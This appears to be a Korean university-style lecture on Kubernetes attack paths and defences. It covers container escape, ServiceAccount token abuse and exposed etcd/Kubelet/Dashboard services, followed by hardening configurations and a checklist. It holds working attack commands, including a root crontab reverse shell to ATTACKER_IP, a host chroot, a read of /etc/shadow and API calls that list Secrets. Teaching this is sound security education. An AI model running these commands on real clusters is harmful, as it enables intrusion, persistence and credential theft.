# Week 12: Kubernetes 공격

## 학습 목표
- Kubernetes 환경의 주요 공격 벡터를 이해한다
- Pod 탈출(escape) 기법과 방어 방법을 익힌다
- ServiceAccount 토큰 악용 시나리오를 파악한다
- Kubernetes 공격 킬체인을 설명할 수 있다

---

## 1. Kubernetes 공격 킬체인

```
1. 초기 접근        → 취약한 웹 앱, 노출된 API 서버
2. 실행             → Pod 내 명령 실행
3. 권한 상승        → SA 토큰, privileged Pod
4. 횡적 이동        → 다른 Pod/노드 접근
5. 데이터 수집      → Secret, ConfigMap 수집
6. 목표 달성        → 데이터 유출, 암호화폐 채굴
```

### MITRE ATT&CK for Containers

| 전술 | Kubernetes 기법 |
|------|----------------|
| Initial Access | 노출된 Dashboard, API Server |
| Execution | exec into container, cronjob |
| Privilege Escalation | privileged Pod, hostPath |
| Lateral Movement | SA 토큰, 내부 서비스 접근 |
| Collection | Secret/ConfigMap 수집 |

---

## 2. Pod 탈출 (Container Escape)

### 2.1 privileged Pod 탈출

```bash
# 공격자가 privileged Pod에 접근한 경우
# 호스트 파일시스템 마운트
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 호스트의 crontab에 리버스 셸 추가
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  >> /mnt/host/var/spool/cron/crontabs/root
```

### 2.2 hostPath 악용

```yaml
# 위험한 Pod 정의
spec:
  containers:
    - name: evil
      image: ubuntu
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /          # 호스트 루트 전체 마운트!
```

```bash
# Pod 내부에서
chroot /host /bin/bash   # 호스트 셸 획득
cat /host/etc/shadow     # 호스트 비밀번호 해시 접근
```

### 2.3 hostPID + nsenter 탈출

```yaml
spec:
  hostPID: true          # 호스트 PID 네임스페이스 공유
  containers:
    - name: escape
      image: ubuntu
      securityContext:
        privileged: true
```

```bash
# Pod 내부에서 호스트의 init 프로세스(PID 1) 네임스페이스 진입
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# → 호스트 셸 획득
```

---

## 3. ServiceAccount 토큰 악용

### 3.1 자동 마운트된 SA 토큰

모든 Pod에는 기본적으로 ServiceAccount 토큰이 마운트된다.

```bash
# Pod 내부에서 SA 토큰 확인
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# CA 인증서
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 네임스페이스
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 3.2 SA 토큰으로 API 서버 접근

```bash
# 토큰과 CA 설정
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# 현재 권한 확인
curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# Secret 목록 조회 시도
curl -sk $APISERVER/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"

# 새 Pod 생성 시도 (RBAC에 따라 허용/거부)
curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil"},...}'
```

### 3.3 과도한 SA 권한 체인

```
웹 앱 취약점 (RCE)
→ Pod 내부 셸 획득
→ SA 토큰 읽기
→ API 서버에서 Secret 조회
→ DB 비밀번호 획득
→ 데이터베이스 접근
→ 데이터 유출
```

---

## 4. 기타 공격 벡터

### 4.1 etcd 직접 접근

etcd가 인증 없이 노출되면 클러스터 전체 정보가 유출된다.

```bash
# etcd가 노출된 경우 (포트 2379)
etcdctl get / --prefix --keys-only
etcdctl get /registry/secrets/default/db-credentials
```

### 4.2 Kubelet API 악용

Kubelet API(포트 10250)가 인증 없이 노출된 경우:

```bash
# Pod 목록 조회
curl -sk https://NODE_IP:10250/pods

# Pod 내부에서 명령 실행
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"
```

### 4.3 노출된 Dashboard

```bash
# Kubernetes Dashboard가 인증 없이 노출된 경우
# 브라우저에서 접근 → 클러스터 전체 관리 가능
# 실제 사고: Tesla의 K8s Dashboard 노출 → 암호화폐 채굴
```

---

## 5. 방어 전략

### 5.1 Pod 보안

```yaml
spec:
  automountServiceAccountToken: false  # SA 토큰 마운트 금지
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
  containers:
    - securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
```

### 5.2 RBAC 강화

```yaml
# 최소 권한 ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
automountServiceAccountToken: false
```

### 5.3 감사 로깅

```yaml
# 감사 정책 (audit-policy.yaml)
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse    # 모든 요청/응답 기록
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
  - level: Metadata           # 메타데이터만 기록
    resources:
      - group: ""
        resources: ["pods"]
```

---

## 6. 실습: 공격 시나리오 이해

### 실습 1: SA 토큰 개념 이해

```bash
# OpsClaw의 API 키 = K8s의 SA 토큰과 유사한 개념
# API 키가 노출되면 전체 시스템 제어 가능

# 올바른 인증
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects

# 인증 없이 시도 → 거부
curl -s http://localhost:8000/projects
```

### 실습 2: LLM으로 K8s 공격 시나리오 분석

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Kubernetes 보안 전문가입니다. 교육 목적으로 공격 시나리오를 분석합니다."},
      {"role": "user", "content": "공격자가 취약한 웹 앱을 통해 Pod에 RCE를 얻었습니다. automountServiceAccountToken이 true이고 SA에 cluster-admin 권한이 있습니다. 공격 킬체인을 단계별로 설명하고, 각 단계의 방어 방법을 알려주세요."}
    ]
  }' | python3 -m json.tool
```

### 실습 3: Docker 환경에서 컨테이너 탈출 체험

```bash
ssh student@10.20.30.80

# privileged 컨테이너에서 호스트 정보 접근 (교육 목적)
docker run --rm --privileged alpine sh -c '
  echo "=== 호스트 커널 정보 ==="
  uname -a
  echo "=== 호스트 디스크 ==="
  fdisk -l 2>/dev/null | head -5
  echo "=== 호스트 프로세스 (hostPID 아님) ==="
  ls /proc | head -20
'

# 비privileged 컨테이너에서는 접근 불가
docker run --rm --cap-drop ALL alpine sh -c '
  fdisk -l 2>/dev/null || echo "디스크 접근 거부됨"
'
```

---

## 7. 공격 방어 체크리스트

- [ ] privileged Pod가 없는가?
- [ ] hostPath, hostNetwork, hostPID를 사용하지 않는가?
- [ ] SA 토큰 자동 마운트를 비활성화했는가?
- [ ] SA에 최소 권한만 부여했는가?
- [ ] API Server에 인증이 설정되어 있는가?
- [ ] etcd가 외부에 노출되지 않는가?
- [ ] Kubelet API에 인증이 설정되어 있는가?
- [ ] Dashboard가 외부에 노출되지 않는가?
- [ ] 감사 로깅이 활성화되어 있는가?

---

## 핵심 정리

1. K8s 공격은 취약한 앱 → Pod 셸 → SA 토큰 → 횡적 이동 순으로 진행된다
2. privileged Pod와 hostPath는 컨테이너 탈출의 주요 경로이다
3. SA 토큰이 자동 마운트되므로, 불필요 시 반드시 비활성화한다
4. etcd, Kubelet API, Dashboard의 노출은 클러스터 전체 장악으로 이어진다
5. 방어의 핵심은 최소 권한 + 네트워크 격리 + 감사 로깅이다

---

## 다음 주 예고
- Week 13: 클라우드 모니터링 - CloudTrail, CloudWatch 개념
